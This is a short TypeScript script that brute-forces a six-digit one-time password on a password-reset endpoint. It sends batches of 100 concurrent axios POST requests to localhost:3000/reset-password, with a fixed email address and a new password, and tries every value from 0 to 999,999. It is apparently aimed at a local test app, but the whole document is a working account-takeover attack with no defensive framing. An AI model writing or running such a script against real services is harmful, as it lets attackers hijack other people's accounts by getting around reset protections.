import axios from "axios";

const sendRequest = async (otp: number): Promise<void> => {
    const data = JSON.stringify({
        email: "varad@gmail.com",
        otp: `${otp}`,
        newPassword: "1234564567"
    });

    const config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "http://localhost:3000/reset-password",
        headers: {
            "Content-Type": "application/json"
        },
        data: data
    };

    try {
        const response = await axios.request(config);
        console.log(response.data);
    } catch (error) {
        console.error(`Error for OTP ${otp}:`);
    }
};

const bruteForce = async () => {
    for (let i = 0; i < 1000000; i += 100) {
        const promises = [];
        console.log(`Processing batch starting with OTP ${i}`);

        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest(i + j));
        }

        try {
            await Promise.all(promises); // Wait for all requests in the batch to complete
        } catch (error) {
            console.error("Batch processing failed:", error);
        }
    }
};

bruteForce();
